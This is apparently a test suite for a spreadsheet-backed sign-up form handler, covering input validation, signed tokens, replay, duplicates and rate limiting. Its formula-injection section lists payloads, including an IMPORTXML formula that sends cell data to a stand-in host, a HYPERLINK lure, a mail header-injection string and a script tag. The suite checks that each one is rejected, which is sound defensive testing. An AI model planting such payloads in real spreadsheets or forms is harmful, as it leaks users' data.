const h = require('./harness.js');
const S = h.sandbox;

let pass = 0, fail = 0;
function check(name, cond) {
  if (cond) { pass++; console.log('  ok   ' + name); }
  else { fail++; console.log('  FAIL ' + name); }
}

function post(body) {
  const res = S.doPost({ postData: { contents: JSON.stringify(body) } });
  return JSON.parse(res.getContent());
}

/* Mints a token with a backdated timestamp, signed with the script's own
   key, so the min-age gate passes without a real 1.2 s wait. Built the
   same way issueToken() builds one. */
function freshToken(ageMs = 5000) {
  const issuedAt = Date.now() - ageMs;
  const nonce = require('crypto').randomUUID();
  return issuedAt + '.' + nonce + '.' + S.hmac_(issuedAt + '.' + nonce);
}

function submit(over = {}, ageMs = 5000) {
  return post(Object.assign({
    fullName: 'Ana Maria Popescu',
    email: 'ana' + Math.random().toString(36).slice(2, 8) + '@example.com',
    token: freshToken(ageMs)
  }, over));
}

/* Lift the rate ceiling out of the way for the rest of the suite; the
   dedicated section below lowers it on purpose. */
S.RATE_MAX = 1e9;

console.log('\nsetup');
const book = S.SpreadsheetApp.getActive();
S.setup();
check('creates the target tab when it is missing',
  !!book.getSheetByName('primeA'));
check('...as the first tab', book.inserted.length === 1 && book.inserted[0].index === 0);
check('setup writes the header row', h.rows.length === 1 && h.rows[0][0] === 'Received At');
check('setup is idempotent', (S.setup(), h.rows.length === 1));
check('...and does not create a second tab', book.inserted.length === 1);
check('a submit reuses the same tab',
  (S.writeRow({ receivedAt: 'x', fullName: 'Tab Test', email: 'a@b.co' }),
   book.inserted.length === 1 && Object.keys(book.tabs).length === 1));

console.log('\nhappy path');
const before = h.rows.length;
const ok = submit();
check('accepts a valid request', ok.ok === true);
check('appends exactly one row', h.rows.length === before + 1);
check('row has the name', h.lastRow()[1] === 'Ana Maria Popescu');
check('row status is Nou', h.lastRow()[3] === 'Nou');

console.log('\nformula / CSV injection');
for (const payload of [
  '=IMPORTXML("https://evil.invalid/?d="&A2,"//a")',
  '+SUM(A1:A9)',
  '-1-1',
  '@A1',
  '=HYPERLINK("https://evil.invalid","claim")'
]) {
  const r = submit({ fullName: payload });
  check('rejects in name: ' + payload.slice(0, 28), r.ok === false && r.error === 'invalid_name');
}
/* Even if a payload ever reaches writeRow, the apostrophe must neutralise it —
   the sheet stub throws if a raw formula lands in a cell. */
let neutralised = true;
try {
  S.writeRow({ receivedAt: '+1', fullName: '=EVIL()', email: 'inert-probe@example.com' });
} catch (e) { neutralised = false; }
check('writeRow stores formulas as inert text', neutralised);
check('...and reads back unchanged', h.lastRow()[1] === '=EVIL()');

console.log('\nvalidation');
check('rejects a missing name', submit({ fullName: '' }).error === 'invalid_name');
check('rejects a one-letter name', submit({ fullName: 'A' }).error === 'invalid_name');
check('rejects digits in a name', submit({ fullName: 'Ana 123' }).error === 'invalid_name');
check('rejects an 81-char name', submit({ fullName: 'A'.repeat(81) }).error === 'invalid_name');
check('accepts diacritics', submit({ fullName: 'Ștefan Țăran-Mureșan' }).ok === true);
check("accepts an apostrophe name", submit({ fullName: "Anne O'Brien" }).ok === true);
check('rejects a bad email', submit({ email: 'not-an-email' }).error === 'invalid_email');
check('rejects a double dot', submit({ email: 'a..b@example.com' }).error === 'invalid_email');
check('rejects a missing TLD', submit({ email: 'a@example' }).error === 'invalid_email');
check('rejects a header-injection email',
  submit({ email: 'a@b.com\nBcc: x@y.com' }).error === 'invalid_email');
check('rejects an html name', submit({ fullName: '<script>alert(1)</script>' }).error === 'invalid_name');
check('rejects a non-string name', submit({ fullName: { toString: () => 'Ana' } }).error === 'invalid_name');
check('rejects an array name', submit({ fullName: ['Ana'] }).error === 'invalid_name');
check('rejects an array body', post([1, 2, 3]).error === 'invalid');
check('rejects a null body', post(null).error === 'invalid');
check('rejects broken json',
  JSON.parse(S.doPost({ postData: { contents: '{oops' } }).getContent()).error === 'invalid');
check('rejects a missing body',
  JSON.parse(S.doPost({}).getContent()).error === 'invalid');
check('rejects an oversized body',
  post({ fullName: 'A'.repeat(5000) }).error === 'invalid');
check('strips zero-width characters',
  submit({ fullName: 'An​a Popescu' }).ok === true && h.lastRow()[1] === 'Ana Popescu');
check('collapses whitespace',
  submit({ fullName: '  Ana   Popescu  ' }).ok === true && h.lastRow()[1] === 'Ana Popescu');
check('lowercases the email',
  submit({ email: 'MiXeD@Example.COM' }).ok === true && h.lastRow()[2] === 'mixed@example.com');

console.log('\nhoneypot');
const rowsBefore = h.rows.length;
const hp = submit({ company: 'Acme Ltd' });
check('answers a filled honeypot with success', hp.ok === true);
check('...and writes nothing', h.rows.length === rowsBefore);
check('...and does not burn the token (no row, no error leak)', hp.error === undefined);

console.log('\ntokens');
check('rejects a missing token', submit({ token: undefined }).error === 'token');
check('rejects a garbage token', submit({ token: 'aaa.bbb.ccc' }).error === 'token');
check('rejects a forged mac',
  submit({ token: Date.now() - 5000 + '.' + '1'.repeat(8) + '-1111-1111-1111-111111111111' + '.forged' }).error === 'token');
check('rejects a token that is too young', submit({}, 100).error === 'token');
check('rejects a token older than 30 min', submit({}, 31 * 60 * 1000).error === 'token');

const reused = freshToken();
const first = submit({ token: reused });
const second = submit({ token: reused });
check('accepts a token once', first.ok === true);
check('rejects the replay', second.ok === false && second.error === 'token');

console.log('\nduplicate guard');
const addr = 'repeat@example.com';
const r1 = submit({ email: addr });
const rowsAfterFirst = h.rows.length;
const r2 = submit({ email: addr });
check('first submit from an address is stored', r1.ok === true);
check('second submit from the same address is rejected',
  r2.ok === false && r2.error === 'duplicate');
check('...and writes no second row', h.rows.length === rowsAfterFirst);
check('the match ignores case',
  submit({ email: addr.toUpperCase() }).error === 'duplicate');
check('a different address still gets through',
  submit({ email: 'someone-else@example.com' }).ok === true);
check('a high volume of distinct addresses all write',
  Array.from({ length: 60 }, (_, i) =>
    submit({ email: 'vol' + i + '@example.com' }).ok).every(Boolean));

console.log('\nGET route');
const tok = JSON.parse(S.doGet({ parameter: { action: 'token' } }).getContent());
check('issues a token', tok.ok === true && typeof tok.token === 'string');
check('no other GET route exists',
  JSON.parse(S.doGet({ parameter: { action: 'list' } }).getContent()).error === 'not_found');
check('bare GET is not found',
  JSON.parse(S.doGet({}).getContent()).error === 'not_found');
check('token response leaks nothing else', Object.keys(tok).sort().join() === 'ok,token');

console.log('\nerror responses');
const shapes = new Set();
[submit({ fullName: '' }), submit({ token: 'x' }), post(null)].forEach(r =>
  shapes.add(Object.keys(r).sort().join()));
check('failures share one shape', shapes.size === 1 && shapes.has('error,ok'));

console.log('\nrate limit');
h.cache.clear();
S.RATE_MAX = 5;
const rl = Array.from({ length: 8 }, (_, i) =>
  submit({ email: 'rl' + i + '@example.com' }));
check('lets through up to the ceiling', rl.slice(0, 5).every(r => r.ok === true));
check('answers busy past the ceiling', rl.slice(5).every(r => r.error === 'busy'));
check('a blocked submit writes no row',
  (n => { const before = h.rows.length; submit({ email: 'rl-x@example.com' }); return h.rows.length === before; })());
S.RATE_MAX = 1e9;
h.cache.clear();

console.log('\n' + pass + ' passed, ' + fail + ' failed');
process.exit(fail ? 1 : 0);
